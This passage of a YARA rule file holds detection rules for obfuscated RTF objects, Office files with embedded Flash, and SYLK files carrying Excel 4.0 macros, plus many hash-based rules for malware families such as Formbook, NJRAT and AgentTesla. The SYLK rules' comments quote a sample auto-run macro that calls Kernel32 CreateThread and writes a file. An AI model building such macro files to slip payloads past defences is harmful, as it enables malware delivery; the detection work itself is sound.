        $update   = "\\objupdate" nocase
        $data     = "\\objdata"   nocase
        $nibble_a = /([A-Fa-f0-9]\\'[A-Fa-f0-9]{4}){4}/
        $nibble_b = /(\\'[A-Fa-f0-9]+\\'[A-Fa-f0-9]{4}){4}/
    condition:
        $magic in (0..30) and all of them and (#nibble_a > 10 or #nibble_b > 10)
}

rule RTF_Byte_Nibble_Obfuscation_method2
{
    strings:
        $magic  = {7b 5c 72}
        $nibble = /\\objupdate.{0,1024}\\objdata.{0,1024}([A-Fa-f0-9]\\'[A-Fa-f0-9]{4}){2}/
    condition:
        $magic in (0..30) and all of them
}
// any office document with an embedded SWF.
// note that we disqualify PE here due to misclassification.
rule swfdoc_hunter
{
    strings:
        $a = { 6e db 7c d2 6d ae cf 11 96 b8 44 45 53 54 00 00 }
        $b = { 57 53 }
    condition:
        $a and $b and not (uint16be(0x0) == 0x4d5a)
}
rule Symbolic_Link_Files_DLL_Reference_Suspicious_Characteristics
{

	meta:
		Author = "InQuest Labs"
    		URL         = "https://github.com/InQuest/yara-rules/blob/master/Symbolic_Link_Files_DLL_Reference_Suspicious_Characteristics.rule"
		Description = "This signature detects Microsoft Excel Symbolic Link (SLK) files that contain reference to DLL files.  While not inherently malicious, these SLK files can be used used by attackers to evade detection and deliver malicious payloads."
		References = "https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/"

	strings:
			$magic = "ID;P"
	
	$re1 = /\x0aO;E[\r\n]/ nocase
	/*The first line with the ID and P records is a marker that indicates this file is a SYLK file.
The second line with the O record sets options for this document. E marks that it is a macro-enabled document.
	*/
	
	$re2 = /\x0a[A-Z];[^\x0a]+E(Call|Open)\x28[ \t]*['"](kernel32|user32|Shell32|urlmon|RunDll|wininet)(\.dll)?[ \t]*['"][ \t]*,[^\x29\x0a]*\x29/ nocase
	//C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
	
	/*
	Sample:
	
	ID;P
	O;E
	NN;NAuto_open;ER1C1;KOutFlank;F
	C;Y1;X1;N;EDIRECTORY()
    C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
	C;X1;Y2;K0;ESELECT(R1C1)
	C;X1;Y2;N;K13;EFIND(":";;R1C1)
	C;X1;Y3;N;K19;EFIND(":";;R1C1;;R2C1+1)
	C;X1;Y4;N;K27;EFIND(":";;R1C1;;R3C1+1)
	C;X1;Y5;N;ELEFT(R1C1;;R4C1 -1)
	C;X1;Y6;N;KFALSE;EDIRECTORY(R[-1]C)
	C;X1;Y7;N;K0;EFOPEN("MALICIOUS.FILE";;3)
	C;X1;Y9;K0;EFWRITE(R7C1;;"PWNED BY OUTFLANK")
	C;X1;Y10;K0;EFCLOSE(R7C1)
	C;X1;Y11;K0;EHALT()
	E
	
	*/
	condition:
			$magic in (0..100) and all of ($re*)
}
rule Symbolic_Link_Files_Macros_File_Characteristic
{

	meta:
		Author = "InQuest Labs"
		URL         = "https://github.com/InQuest/yara-rules/edit/master/Symbolic_Link_Files_Macros_File_Characteristic.rule"
		Description = "This signature detects Symbolic Link (SLK) files that contain Excel 4.0 macros. While not inherently malicious, these SLK files can be used used by attackers to evade detection and deliver malicious payloads."
		References = "https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/"

	strings:
			$magic = "ID;P"
	
	$re1 = /\x0aO;E[\r\n]/ nocase
	/*The first line with the ID and P records is a marker that indicates this file is a SYLK file.
The second line with the O record sets options for this document. E marks that it is a macro-enabled document.
	*/
	
	//If we want to be extra cautious then we can enable $re2 
	//$re2 = /\x0aNN;NAuto_open;/ nocase
	//third line is a names record NN. We set the name Auto_open for the cell at row 1, column 1 (ER1C1).
	
	/*
	Sample:
	
	ID;P
	O;E
	NN;NAuto_open;ER1C1;KOutFlank;F
	C;Y1;X1;N;EDIRECTORY()
	C;X1;Y2;K0;ESELECT(R1C1)
	C;X1;Y2;N;K13;EFIND(":";;R1C1)
	C;X1;Y3;N;K19;EFIND(":";;R1C1;;R2C1+1)
	C;X1;Y4;N;K27;EFIND(":";;R1C1;;R3C1+1)
	C;X1;Y5;N;ELEFT(R1C1;;R4C1 -1)
	C;X1;Y6;N;KFALSE;EDIRECTORY(R[-1]C)
	C;X1;Y7;N;K0;EFOPEN("MALICIOUS.FILE";;3)
	C;X1;Y9;K0;EFWRITE(R7C1;;"PWNED BY OUTFLANK")
	C;X1;Y10;K0;EFCLOSE(R7C1)
	C;X1;Y11;K0;EHALT()
	E
	
	*/
	condition:
			$magic in (0..100) and all of ($re*)
}
import "hash"

rule RESERVED_QA
{
meta:
ref_IOC = "RESERVED_QA"
author = "Laboratoire Epidemiology & Signal Intelligence"

condition:
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_7z
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-15 19:09:26"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "7z"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "23c1510d3d22c30ed9ef184edf9f2e078906915b5e37e67b023230b8cd60403f" or
hash.sha256(0, filesize) == "f52747475852e8cf7e34f28be8946365d35d52a8d2b5339ec8ce9a302a4bf049" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_xlsx
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-15 18:46:34"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "xlsx"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "ad208fe787c74f455a317a5050c3462c8236ed6e3c58f9c6082147ca09902335" or
hash.sha256(0, filesize) == "e583e248ba55bfc925e3ea9bb9f45bbf4473b87cdec850a62dff5f25f4945dff" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_FORMBOOK___exe_
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_FORMBOOK_LAB"
date_IOC = "2023-11-15 07:39:10"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "FORMBOOK"
file_type = "__exe_"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "a0a6a1c54775713ad3e884b6bc49f2c74f393464a69175c8713221504ae6d72a" or
hash.sha256(0, filesize) == "cf33cf1b99aec2e58ebff495b327734f9d444884af6846ea086c210bd4ee2623" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_FORMBOOK___ace_
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_FORMBOOK_LAB"
date_IOC = "2023-11-15 07:38:59"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "FORMBOOK"
file_type = "__ace_"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "4b0088a5ea5b554b183064229db63803bac5538cd7cb9f5f1092e50dce0d4ade" or
hash.sha256(0, filesize) == "7d3b00a4fcda70ad6620192068b141cc01d43f1d4ed650ddd65593cb24f7f9c1" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NJRAT_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NJRAT_LAB"
date_IOC = "2023-11-15 03:31:26"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NJRAT"
file_type = "exe"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "dd1200655c6acff2c7a4d4d3a0c86399a9f23823535e9e6224860a521f360678" or
hash.sha256(0, filesize) == "ac8753ced58a7ac1ee13dc6de9f1007cdc10e9be93e398f4fa64689f2ff22ae7" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_COINMINER_msi
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_COINMINER_LAB"
date_IOC = "2023-11-14 18:22:54"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "COINMINER"
file_type = "msi"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "c29a303468ce5c3274902765deac7a76d4fa98c10657be06acd7d1a358341c93" or
hash.sha256(0, filesize) == "ca4a43510da2087936b6a7aa6790d506f4aba6b1ff1f1d9fcc8fcba37fb47749" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_DCRAT_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_DCRAT_LAB"
date_IOC = "2023-11-14 12:45:44"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "DCRAT"
file_type = "exe"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "07fa9ac4502b2a0ba83036450abbe28d6656c8941abf5180e81650550aa50a4e" or
hash.sha256(0, filesize) == "b84309a3904c7956ca30b8803e41862ab7b4de1dd943f57ce5a211f2479e48c4" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_AGENTTESLA_z
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_AGENTTESLA_LAB"
date_IOC = "2023-11-14 12:24:08"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "AGENTTESLA"
file_type = "z"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "f225748d809c050133e79a599b01e18472d8bd66591e679c54e66c2b33c43509" or
hash.sha256(0, filesize) == "7a8f27f3ad544c3c482f04e8fcb92fdeb4d19250228b3522ad4490aad2ae4b8d" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_REMCOSRAT_zip
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_REMCOSRAT_LAB"
date_IOC = "2023-11-14 11:57:52"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "REMCOSRAT"
file_type = "zip"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "12b615a29aa38f8084b6e23828007897953c887037a8ebea8828c62cfb396831" or
hash.sha256(0, filesize) == "392624a0ee0d3c34ae9ad9607e9f8683156447379beac0ec8519c70dedbb74d0" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_FORMBOOK_zip
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_FORMBOOK_LAB"
date_IOC = "2023-11-14 09:03:02"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "FORMBOOK"
file_type = "zip"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "7be9d6679205f724ef08f8aeb900ff19e0ccc47bda06a458cf84138406056de4" or
hash.sha256(0, filesize) == "54991e3f6afe4b0c7f2d6d43dada59b2614ce28f0af811eadf2bf7a213b13b58" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_PRIVATELOADER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_PRIVATELOADER_LAB"
date_IOC = "2023-11-14 08:19:34"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "PRIVATELOADER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "2cb5b2678054dd2f1b93d37a96b927830c4a7da699f061adee370807088257de" or
hash.sha256(0, filesize) == "38981ca59bd6187df55f92af67932a165b44a30587be906232e42f87c160d523" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_LOKI_xls
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_LOKI_LAB"
date_IOC = "2023-11-14 06:53:30"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "LOKI"
file_type = "xls"
comment = "Source : abuse.ch"


condition:

hash.sha256(0, filesize) == "174489d70aa181c2994b063518b349b1b23eabd988f192b37ea3112241d93f44" or
hash.sha256(0, filesize) == "542e4e849b04fa8953a08ecb6ddd300120855e69c9f5df0975ddf1935eacf408" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}

rule IOC_NA_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-14 03:38:16"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "dda58e02acca78a978c8ae8a82b34e3dee6db965b3c101731cbec2850cf5477f" or
hash.sha256(0, filesize) == "90e4f566d5c15666ff4037b6876350c449e5b0f0f9a87bd0f950012d0d42541b" or
hash.sha256(0, filesize) == "39c8e9229a2789a66a452eb9ccc656198aef60ab761f4a24794159b91ad67a4b" or
hash.sha256(0, filesize) == "c99f57b763d90598609eb0b585ca8399057531d171021d3052efdefe26289117" or
hash.sha256(0, filesize) == "c5c00a192d1427f8d60b64e3e769c7f16b2fee7133dee7c63c042faaea4919fb" or
hash.sha256(0, filesize) == "4249959b292b1ff31e325395430cd1f438e432fa578d219bdb78983a30019873" or
hash.sha256(0, filesize) == "3e23c3ee33d73dfaa575173e9467fd32e7bf14c33723b19691a91abefb283ef8" or
hash.sha256(0, filesize) == "9526a4e0b40f262bc5cd1e07a8b80f465e052c18b3698e496ba0e2dd6549127a" or
hash.sha256(0, filesize) == "827f8d64cd3023b078e30dcc014306c90fb3383b75b58b9479d0d19dcfc15894" or
hash.sha256(0, filesize) == "f4bdddb45e727c8699340ba8d520a37e07b0becb4c571a67b3c9f4ce3a138213" or
hash.sha256(0, filesize) == "8094ecda8ca0f8d5adb805dfef15a5d13c1dd670c3fd701ea98c36d19fde8cfd" or
hash.sha256(0, filesize) == "08cb1432c512df0370577dc50549ad06f729858143017fe00f79fcb218872d01" or
hash.sha256(0, filesize) == "b760fd1b8d86af6b67ac24e6a269f2ffbc818d37f7930fb562cce1331213d031" or
hash.sha256(0, filesize) == "14b8daae29a4a354bdb62a5c3034941a1be3a161193489a624c8de3450a9442d" or
hash.sha256(0, filesize) == "02d956d1f2c9ecdc43ebcbfef06dc160cdd9e5e31f50c692bde9ed1dd9797040" or
hash.sha256(0, filesize) == "e5f25600b1e6483536bae239c5ff59e496fad54cd9ca1d82be94e26f27be5fa8" or
hash.sha256(0, filesize) == "0985988c4ec01ce89ab73cd68d1e4d3944c8eafc4b5a69d0cd451487e97ff6a8" or
hash.sha256(0, filesize) == "5772ac53f3ea00ee06f592ea27fe7f119f2027de5dcf72005a35a4302eb2d524" or
hash.sha256(0, filesize) == "41b8a012d8dd2aa525aa05e5d296e13d4994110cefa41068adfb80eec0e3efe7" or
hash.sha256(0, filesize) == "c3f6354c94ae880d0254f356f2836aaf4aec81b903e4054f75f6e517183e9fce" or
hash.sha256(0, filesize) == "2aaa4c723b5868576aa1be98426763d3c75b1255aa639516c46d5867d2e970a4" or
hash.sha256(0, filesize) == "36464f131691f5a812e22d4255377f79a475700185352606586f671b9ab63b66" or
hash.sha256(0, filesize) == "d6e31c14d40784a2ff3b92ddea17ceb6eace0d64c4526bf17f8932700528dfe1" or
hash.sha256(0, filesize) == "871c57f351c6debafe3210ce09ccdb78f8ec84223ac7d70ab96126b1bf5f6d6c" or
hash.sha256(0, filesize) == "ca45f40c10f30d2c60b2ab67afffc295763d61c890f92b4bc71885d96ac56e18" or
hash.sha256(0, filesize) == "8a119d3b9fce9c74bec4f0a150d29ff043af16ec7202b42c23b4c77da5266676" or
hash.sha256(0, filesize) == "02ee3096c2471e5645404518b3fefd9c72b473bcefbd7c2ee167256546cdd030" or
hash.sha256(0, filesize) == "d102730f766be0466151499f76d91af1c8f4c57ed3d973fcf60f1ff16a0b2594" or
hash.sha256(0, filesize) == "12e7cbc39bce880ee356a8946fe22b8dfe01a8a21b90c0291ec774d5bc640f44" or
hash.sha256(0, filesize) == "e3ca09965edf62f810d4889f9650b4669791102332ed761769f0ca9dabed1908" or
hash.sha256(0, filesize) == "c9fcea3aed96b45b349ee794e0cd17c073b76a251f5dbc2285a2025e76225654" or
hash.sha256(0, filesize) == "d09f9f6cdc590384d14c7aa5e5580fc0a358d0aa0f05199d12faf6ee17937646" or
hash.sha256(0, filesize) == "ee36161c6b3635240df4c30f370420483174cc1a4999a386952d452d0de03c40" or
hash.sha256(0, filesize) == "e61ed0d2ac83d2875180b1a33e04834aa6ca7dba7a5663e8d6e65a4482537576" or
hash.sha256(0, filesize) == "03c4bbba0969018b4e4e048b8f3c52ce0d99a3e37da9ed11a18997e8a836f28f" or
hash.sha256(0, filesize) == "c28c4cec1d98e3f612108826f92aef8d25da93ec22ac1b91523e944126ad0dbb" or
hash.sha256(0, filesize) == "78a194ef979ef86b3001e42bde28be13a7efa2f5744ac4b5126036bbce309606" or
hash.sha256(0, filesize) == "ecbff5a6e21170f5156f18ae42e78f6b2c38c36889fee23121683151b5e6e698" or
hash.sha256(0, filesize) == "a56f0f054bd35ec2153c00022e9c811c24e2a352e7e1a0e7c23daa96d86da910" or
hash.sha256(0, filesize) == "2d779ca15bff11fdaeaaead808f4887d4bbd30b441ce9d4ef6dfb28b748e8769" or
hash.sha256(0, filesize) == "1c5682f07fcc6d16f137dc06f714388e040eb5a3209152bfff09563b545ff4ee" or
hash.sha256(0, filesize) == "ff625dd0483caccac07b4233e3f8174a2237b8382da090067dc66213f5d9c8f5" or
hash.sha256(0, filesize) == "588f49a1ba2f244d08911daaf351bc36ac8bffa5802eefe73a0ef1b7c4fc2a7e" or
hash.sha256(0, filesize) == "047c2fb47c8227863ce3f9e4fe5c1e8fee7e3172019d56a27734178bb20a718c" or
hash.sha256(0, filesize) == "686d46dc014ea066ed05b568eacffa901ab77f09ea65773ecd7ce8daed8b6b14" or
hash.sha256(0, filesize) == "694b86530d202beb35223e351fe7cf8d5221b8b61b9326571039451a76272564" or
hash.sha256(0, filesize) == "f4c4986fd011f3ef1223329e0433fd0d8766d27596bb02566b7afdcba0f21ea7" or
hash.sha256(0, filesize) == "fe87527ba3585e4e2437669ad1d4922dca958a78ed2416ed8426a8abf0ee2f6b" or
hash.sha256(0, filesize) == "7639d10533c0fbbe7a72fbc584a77b48b2758d6b8e4587a6f2e78bb7dd715a2d" or
hash.sha256(0, filesize) == "9a4b6b2f92768653a963bc7658be529a27e94bf082d8c8843f189ecb85dcc653" or
hash.sha256(0, filesize) == "f33cdca93db97c4b84af9f01216f3b7bcb3cf1865df84cb3b64fbbeed7057a2a" or
hash.sha256(0, filesize) == "4be5f0cbc0f19546855afc9e8af0eafea9f10fb751ec9c1dea7ab88fb4543c21" or
hash.sha256(0, filesize) == "764e1d6e17b2bf3ff9beab19e067594d2a7f1fdcd9f3fe74031c11f650aa2f49" or
hash.sha256(0, filesize) == "470cf66bec58f48d4290d8440bef7c00fcfbd0f334504c5d2ac6739b8929ea7b" or
hash.sha256(0, filesize) == "3bad32b4a4a4a24f88120c59519a942f29c71bbc638fda3c0b06655c29742c43" or
hash.sha256(0, filesize) == "5bba406a5a9d3739ec90e3d6d5e619c849807e6e8d50d80ff80f7a34bb4b30a8" or
hash.sha256(0, filesize) == "296a2dbc2d3de1c05763952fb82b7cdd2d5f6deccad03c9617da144761993413" or
hash.sha256(0, filesize) == "4dafdfbf52d678a0138311e426f4b5681b0adfcbf63eacf941040be1a1b62508" or
hash.sha256(0, filesize) == "94e606d5814003e1ad02da673542321ff27f3c0900e5d80c10f5a2b163e9be95" or
hash.sha256(0, filesize) == "0808202fc3bd5e570b2106a4f991de5beeee739960b1167a590da92727b813a6" or
hash.sha256(0, filesize) == "6c485e5e8e555eea6d9df398da467fc006baa7b621dcc8d87730b32b037e5525" or
hash.sha256(0, filesize) == "a31e66233b55244dea9219f5b5a4df56732ea52b4d2c7dac246851fcb9b9c318" or
hash.sha256(0, filesize) == "97cd6e5130cbaa45bd0281318c61c122cca866764dcfc87670422dbe4bfa8d6b" or
hash.sha256(0, filesize) == "7aa30ac897fcf18158968453dcaa7a57d39aea3f5292a949bfede803e55bc8f1" or
hash.sha256(0, filesize) == "a0b708c25e2fce2346235d0bb42abc98432e664bec6e925a04e9636277ead082" or
hash.sha256(0, filesize) == "d790818dae55b8474612f9a1d45d4cffd35d083dc4ee2215b94ad9acb1aad808" or
hash.sha256(0, filesize) == "2e3b753447ccd7d4a766dce1392d884fc6a3632d858f77ad19465a6504708ae6" or
hash.sha256(0, filesize) == "24c0f541525bb734bd6ee6ce4328b752fba618092cbad8131e7418341da99134" or
hash.sha256(0, filesize) == "e51d0b81ca8d23771538b6f9f787293c86fb78ad2d30fb09a57a9f8bc301dac7" or
hash.sha256(0, filesize) == "6006d9cff2c3f472eeb4ca93ecf66a5e77014079508b6b0e75e1d58a0335ff62" or
hash.sha256(0, filesize) == "29c63521ac9ec647a95c3330a23aced7ce53f1101c23a71f2d30350bfcaa7b27" or
hash.sha256(0, filesize) == "444ed0d8b62bdd8da294c6a49e47a7f8a15fcec43409780ea00997a0bf53ffe5" or
hash.sha256(0, filesize) == "6f40d5c35c41245183c6866fb0a4f8a60c5a70079213b1c76792c269f174364f" or
hash.sha256(0, filesize) == "c957b6e7aeb2e6b6af16e5da1a09ccd6d5eb139a0db5429cfcc67a0a954c9bbf" or
hash.sha256(0, filesize) == "46a95f00106f48d7ecf75c41fac059e5f5766f7cefec73e2638d9dfbe27e7f10" or
hash.sha256(0, filesize) == "7c31d4fe105e60a9729dbd33357ddc20f3526a5ec2dfd1fc69eaa1668f289804" or
hash.sha256(0, filesize) == "6927a9e73bf55a3401c967648cfc9f0d1d6cbf7cf452dd483620992d7d8b34e2" or
hash.sha256(0, filesize) == "7e512bb8c1dade78162ab6116b93dd3db2cbf91dddf09d05955fa5fdcdbd7113" or
hash.sha256(0, filesize) == "557e98b9d9d27da718e9ea7e20535535f3b0f796fe85a636eb14c418cc28c21a" or
hash.sha256(0, filesize) == "bb4d377bc3a7dd434ee93d3de114df09e1985dfcca00d344d9ad656dbbc07493" or
hash.sha256(0, filesize) == "dd69c8ab0e6f97b1e877054189d93360498d5bde5a61ec6aa100e04741c303f9" or
hash.sha256(0, filesize) == "cf03c50f7197f7511f36824745a247f4dcedb427689fcb1f34074f07ed99b5ce" or
hash.sha256(0, filesize) == "28dc1b057af09d247f9bdede84202dd18aa81b30a6583a152a101d1b2d91f26b" or
hash.sha256(0, filesize) == "a4a651ae85e06287fdbd48c3d753856b07429f1c8b9566312cab224980f7895c" or
hash.sha256(0, filesize) == "93f4f7dd1458ebc9caa287fe4a81737a417a75ab8e3a4a150c5c907f87b51d11" or
hash.sha256(0, filesize) == "235f5430842be63a9bca58fb148480b6d6a1f0a0631ace17e78bf8430c5f98e0" or
hash.sha256(0, filesize) == "d61440747490d4b403f4436639207f3a665dca0cd035267ae044ceff6a0c80e9" or
hash.sha256(0, filesize) == "1809dddc2ed1656288e8932cf69022e58b688310423dcb7159fc73b38ee5abb0" or
hash.sha256(0, filesize) == "b3b3761301129116546060fdda707826c64c631f45c7af948a809fc4e81cd87c" or
hash.sha256(0, filesize) == "ff8973e265cde0ecfc91cb81ae4af75946b2cfcaa772b5cd1390c176e788175f" or
hash.sha256(0, filesize) == "dcf2b30da73634394e398e44c84ea1f525a6e2b5f29114a0c504c50e119515b5" or
hash.sha256(0, filesize) == "e40ee5b484b1f3e630bb257ab3424acefd5b2bc9979664415774a080e69623ad" or
hash.sha256(0, filesize) == "f51088a42ffcbd2b95644e0861da35421244abe85928ada80ad383345ff0167f" or
hash.sha256(0, filesize) == "84ff81ced73bc59be766c505ef9e65c6f898f334d3de0510d18248254119b326" or
hash.sha256(0, filesize) == "c3efd2ad3d87e34d909c43790872b69e41232c05d8d498d1e1ee6c928573a33e" or
hash.sha256(0, filesize) == "86951a2c31972c2d34d5eb44f518c05a449c00d751163282639f41bc5fac09f3" or
hash.sha256(0, filesize) == "75386126b0ae0fb4e2f71f083c56ac8fa726482058e2b44274c6bbd51cd88b59" or
hash.sha256(0, filesize) == "9b1d3802c41f21dcfc6ae41d795a56f200bd4298424b5fd9f4f66a4e5de88d65" or
hash.sha256(0, filesize) == "f890008561d6268df4e91f4d14c9ec70e42bbb8f7af20fb68e368e542edebc16" or
hash.sha256(0, filesize) == "1ded59a79c592a70a138f44b71118e2a7f86663902557cf6b8a109989ea53c7d" or
hash.sha256(0, filesize) == "604c88cf909edfb72deda4ba7e0a78a7981fb9420df6e367c174d098e7460f3b" or
hash.sha256(0, filesize) == "8022240f5a37f269d0a553c7dff56748864cadeafd8a603ff2920cc69c6bbf76" or
hash.sha256(0, filesize) == "67b6d2863ac03575f1643fd37379908ece6763943a26163d8f72d345bf1dbcbf" or
hash.sha256(0, filesize) == "f6a51523b06781d76acee7cc96c996852e35ef0e053e5c4ec5604084cbbdaf3a" or
hash.sha256(0, filesize) == "ffede509da3e56af0d1a53dbac78a5d9fa35ce43b35f4df847f88f9b583ea709" or
hash.sha256(0, filesize) == "d363c2dc7eadf1fbfc9bee1983f948677d4495ec13682c6298cfc8647fa47b54" or
hash.sha256(0, filesize) == "76ea6fc5e2e808633b789fd8c300e15bca434185c6007de3eb98ed1e6dc70070" or
hash.sha256(0, filesize) == "044058594de29392ad9bb466f082e9f276a19c7ebe6718f15be2075fd4351d69" or
hash.sha256(0, filesize) == "0f49b20d665b676b9747fb999382df30f011d8d70284898338b27b80cba3ff1e" or
hash.sha256(0, filesize) == "2f9666700b7a72f77462a3bf62380c47989a0a47e80c544a91b46c3b39d023c0" or
hash.sha256(0, filesize) == "2018c59cb48d035db9403e9a6c647c8054369fdaff3fc8bf2284607a6a792e97" or
hash.sha256(0, filesize) == "a6f065630c7b482267b7fd73a39c55615b8e6e35e258c1798ca42878ea989905" or
hash.sha256(0, filesize) == "3f5c81d5d3aedabfaf11533ea280b538a65b2f5dd9ee6129f38f1684399366f3" or
hash.sha256(0, filesize) == "7f25012f931ae9d691b9b2e393ec959eec7bad5987805440f325b13b3c033957" or
hash.sha256(0, filesize) == "6521d0033c9c95469564c86efaefe94eb653f46a1ccb7750968d7c54e0fd90ca" or
hash.sha256(0, filesize) == "efc9826c30aba11a06834d0e31c10f7ddb804fda6c05a02b796f4084d3e2ffab" or
hash.sha256(0, filesize) == "9672eb651f72a3dc2a2b676d56d5e3424392123e3ae883719097af836129eb34" or
hash.sha256(0, filesize) == "eec69f942751816a1f48afa25f329d5ea8e630fda1604be8e1a688046d63338a" or
hash.sha256(0, filesize) == "9084ecef307c10374f2b4f6d54f7ab929a33ae254b349abf3f7399a8e6cb381f" or
hash.sha256(0, filesize) == "eedbc0caf5c43d780e840abda5c3dc64721dfd24c0da7143440418317ba1502f" or
hash.sha256(0, filesize) == "df5397b08e1b72fbf42290033aa11934e895488c93b76e608542fbb49d2e0f98" or
hash.sha256(0, filesize) == "8538681af5bcf6c5742e9407c89c6caabe24b0453397b1712448177bff21f6d1" or
hash.sha256(0, filesize) == "320f28727f308f0af628c0c1caf800bcb1754bd14df74361d5cefbaa5e148a8f" or
hash.sha256(0, filesize) == "38d18a3ec97b64fa831a7521126687baa6cdbf0a859a92c500549fd25df7ebbc" or
hash.sha256(0, filesize) == "c9a332638e2409f1b8366c9f4ede9b939540c367eab9eba3aa2f935ad74c2a9c" or
hash.sha256(0, filesize) == "aa0668633c7c710b0a09adc99362b4a3547307f0b3f1338ae731c35d9b071d88" or
hash.sha256(0, filesize) == "59bc63fd20252adcfdb6ccd58c036c0938354e467d47bec626c1063791f1151f" or
hash.sha256(0, filesize) == "7f17d3d47f053498a3efecab532932dcc8018e3ee0da60fb090be0abc3fa5a82" or
hash.sha256(0, filesize) == "b5acf14cdac40be590318dee95425d0746e85b1b7b1cbd14da66f21f2522bf4d" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_elf
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-15 03:14:40"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "elf"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "cd378b012d0bdef2786e3d488cee11fd34b93d1cad9339351bcbbcf6b0214017" or
hash.sha256(0, filesize) == "3a43116d507d58f3c9717f2cb0a3d06d0c5a7dc29f601e9c2b976ee6d9c8713f" or
hash.sha256(0, filesize) == "edc9e39acb46cb0fd23edf9df42e7b94c3f33e20c01aa3eac58f02eb95a97f76" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_LUMMASTEALER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
